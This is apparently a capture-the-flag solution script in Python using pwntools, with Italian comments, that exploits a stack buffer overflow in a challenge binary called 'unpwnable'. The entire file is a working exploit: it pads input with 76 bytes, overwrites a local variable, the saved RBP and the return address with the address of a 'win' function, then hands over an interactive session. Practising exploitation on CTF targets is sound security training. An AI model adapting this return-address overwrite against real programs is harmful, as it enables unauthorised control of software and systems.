#p32 per gli interi
from pwn import *
from Crypto.Util.number import bytes_to_long
def main():

    #conn = remote('unpwnable.challs.pascalctf.it', 1338)
    conn = process('/home/mattia/Documents/unpwnable')
    conn.recvuntil(b":\n") 
    
    win_addr = 0x401196
    
    payload = b'A' * 76
    payload += p32(1000)  # 76 + 4 + 8 + 8 = 96 ==> riempio s, n, rbp e win_addr     
    conn.sendline(payload)
    print(f'payload: {payload}')

    
    conn.recvuntil('Buy amazing stuff\n')
    conn.sendline(b'69')  
    
    payload = b'A' * 76 # s
    payload += b'B' * 4 # n
    payload += b'C' * 8 # RBP
    payload += p64(win_addr) #indirizzo win
    conn.sendline(payload)
    print(f'payload: {payload}')
    
    conn.interactive()

if __name__ == "__main__":
    main()
    
#Funziona ma sono stato truffato :(